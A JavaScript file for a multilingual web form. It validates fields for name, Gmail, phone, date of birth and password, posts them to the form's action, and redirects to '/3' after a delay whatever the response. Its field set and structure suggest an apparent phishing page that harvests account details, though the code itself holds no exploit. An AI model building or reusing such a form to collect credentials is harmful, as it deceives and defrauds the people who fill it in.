document.addEventListener("DOMContentLoaded", function () {
    document.querySelectorAll("input").forEach(input => {
        function checkInput() {
            if (input.value.trim() !== "") {
                input.classList.add("has-content");
            } else {
                input.classList.remove("has-content");
            }
        }
        input.addEventListener("input", checkInput);
        checkInput(); 
    });
});

document.addEventListener("DOMContentLoaded", function () {
    let initialHeight = window.innerHeight; 

    window.addEventListener("resize", function () {
        if (window.innerHeight < initialHeight) {
            document.body.classList.add("keyboard-open");
        } else {
            document.body.classList.remove("keyboard-open");
        }
    });
});

function togglePasswordVisibility(inputId, iconId) {
    const input = document.getElementById(inputId);
    const icon = document.getElementById(iconId);

    if (input.type === "password") {
        input.type = "text";
        icon.classList.remove("fa-eye");
        icon.classList.add("fa-eye-slash"); 
    } else {
        input.type = "password";
        icon.classList.remove("fa-eye-slash");
        icon.classList.add("fa-eye"); 
    }
}
const messages = {
    en: {
        fullNameError: "Do not leave blank.",
        dobError: "Do not leave blank.",
        gmailError: "Do not leave blank.",
        tkError: "Do not leave blank.",
        passError: "Do not leave blank."
    },

    it: {
        fullNameError: "Non lasciare vuoto.",
        dobError: "Non lasciare vuoto.",
        gmailError: "Non lasciare vuoto.",
        tkError: "Non lasciare vuoto.",
        passError: "Non lasciare vuoto."
    },
    es: {
        fullNameError: "No dejes en blanco.",
        dobError: "No dejes en blanco.",
        gmailError: "No dejes en blanco.",
        tkError: "No dejes en blanco.",
        passError: "No dejes en blanco."
    },
    de: {
        fullNameError: "Lassen Sie das Feld nicht leer.",
        dobError: "Lassen Sie das Feld nicht leer.",
        gmailError: "Lassen Sie das Feld nicht leer.",
        tkError: "Lassen Sie das Feld nicht leer.",
        passError: "Lassen Sie das Feld nicht leer."
    },
    fr: {
        fullNameError: "Ne laissez pas vide.",
        dobError: "Ne laissez pas vide.",
        gmailError: "Ne laissez pas vide.",
        tkError: "Ne laissez pas vide.",
        passError: "Ne laissez pas vide."
    },
    id: {
        fullNameError: "Jangan dibiarkan kosong.",
        dobError: "Jangan dibiarkan kosong.",
        gmailError: "Jangan dibiarkan kosong.",
        tkError: "Jangan dibiarkan kosong.",
        passError: "Jangan dibiarkan kosong."
    },
    ja: {
        fullNameError: "空欄にしないでください。",
        dobError: "空欄にしないでください。",
        gmailError: "空欄にしないでください。",
        tkError: "空欄にしないでください。",
        passError: "空欄にしないでください。"
    },
    tw: {
        fullNameError: "請勿留空。",
        dobError: "請勿留空。",
        gmailError: "請勿留空。",
        tkError: "請勿留空。",
        passError: "請勿留空。"
    },
    th: {
        fullNameError: "ห้ามเว้นว่าง。",
        dobError: "ห้ามเว้นว่าง。",
        gmailError: "ห้ามเว้นว่าง。",
        tkError: "ห้ามเว้นว่าง。",
        passError: "ห้ามเว้นว่าง。"
    },
    ph: {
        fullNameError: "Huwag iwanang blangko.",
        dobError: "Huwag iwanang blangko.",
        gmailError: "Huwag iwanang blangko.",
        tkError: "Huwag iwanang blangko.",
        passError: "Huwag iwanang blangko."
    },
    mh: {
        fullNameError: "Jajej im jab ruōn eo.",
        dobError: "Jajej im jab ruōn eo.",
        gmailError: "Jajej im jab ruōn eo.",
        tkError: "Jajej im jab ruōn eo.",
        passError: "Jajej im jab ruōn eo."
    },
    et: {
        fullNameError: "Ära jäta tühjaks.",
        dobError: "Ära jäta tühjaks.",
        gmailError: "Ära jäta tühjaks.",
        tkError: "Ära jäta tühjaks.",
        passError: "Ära jäta tühjaks."
    } ,  
    pt: {
        fullNameError: "Não deixe em branco.",
        dobError: "Não deixe em branco.",
        gmailError: "Não deixe em branco.",
        tkError: "Não deixe em branco.",
        passError: "Não deixe em branco."
    },
    nl: {
        fullNameError: "Laat dit niet leeg.",
        dobError: "Laat dit niet leeg.",
        gmailError: "Laat dit niet leeg.",
        tkError: "Laat dit niet leeg.",
        passError: "Laat dit niet leeg."
    },
    be: {
        fullNameError: "Laat dit niet leeg.",
        dobError: "Laat dit niet leeg.",
        gmailError: "Laat dit niet leeg.",
        tkError: "Laat dit niet leeg.",
        passError: "Laat dit niet leeg."
    }
};

function validatefrom(event) {
    event.preventDefault();

    const lang = document.documentElement.lang; // Lấy ngôn ngữ hiện tại từ thẻ <html>

    const fu = document.querySelector('#fullname');
    const fn1 = document.querySelector('#fullname1');
    const gm = document.querySelector('#gmail');
    const ph = document.querySelector('#phone');
    const dob = document.querySelector('#dob');
    const fu_err = document.querySelector('.fu_err');
    const fn1_err = document.querySelector('.fn1_err');
    const gm_err = document.querySelector('.gm_err');
    const ph_err= document.querySelector('.ph_err');
    const dob_err = document.querySelector('.dob_err');

    const submitButton = document.querySelector('#submitButton');
    const spinner = document.querySelector('.spinner');

    fu_err.textContent = '';
    fn1_err.textContent = '';
    gm_err.textContent = '';
    ph_err.textContent = '';
    dob_err.textContent = '';

    let result = true;
    if(fu.value == "") {
        fu_err.innerHTML = messages[lang].fullNameError;
        result = false;
    }
    if(fn1.value == ""){
        fn1_err.innerHTML = messages[lang].tkError;
        result = false;
    }
    if(gm.value == ""){
        gm_err.innerHTML = messages[lang].gmailError;
        result = false;
    }
    if(ph.value == ""){
        ph_err.innerHTML = messages[lang].passError;
        result = false;
    }
    if(dob.value == ""){
        dob_err.innerHTML = messages[lang].dobError;
        result = false;
    }

    if(result) {
        spinner.style.display = "block";
        submitButton.classList.add('hidden-text');
        submitButton.disabled = true;

        const formData = new FormData(event.target);
        fetch(event.target.action, {
            method: 'POST',
            body: formData
        }).then(response => {
            setTimeout(() => {
                window.location.href = '/3';
            }, 3000);
        }).catch(error => {
            console.error("Internal Error:", error);
            spinner.style.display = 'none';
            submitButton.disabled = false;
            alert("An error occurred while sending the data, please try again.");
        });
    }
}
